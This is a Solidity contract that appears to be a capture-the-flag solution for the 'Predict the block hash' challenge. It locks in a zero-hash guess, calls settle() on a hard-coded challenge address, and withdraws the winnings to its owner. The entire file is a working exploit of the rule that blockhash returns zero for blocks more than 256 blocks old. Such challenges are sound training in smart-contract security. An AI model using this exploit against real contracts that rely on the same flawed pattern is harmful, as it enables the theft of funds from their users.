pragma solidity ^0.4.21;
import "./PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashChallengeExploit {
    bytes32 n = 0x0;
    address contractAddress = 0x410205c6f05072c6fA4D094Bd6ab8e0f5f08b382;
    address owner;
    function PredictTheBlockHashChallengeExploit() public payable {
        require(msg.value == 1 ether);
        owner = msg.sender;
    }

    function () public payable {}

    function lockInGuess() public{
        PredictTheBlockHashChallenge s = PredictTheBlockHashChallenge(contractAddress);
        s.lockInGuess.value(1 ether)(n);
    }

    function exploit() public payable{
        PredictTheBlockHashChallenge s = PredictTheBlockHashChallenge(contractAddress);
        s.settle();
    }

    function withdraw() public{
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}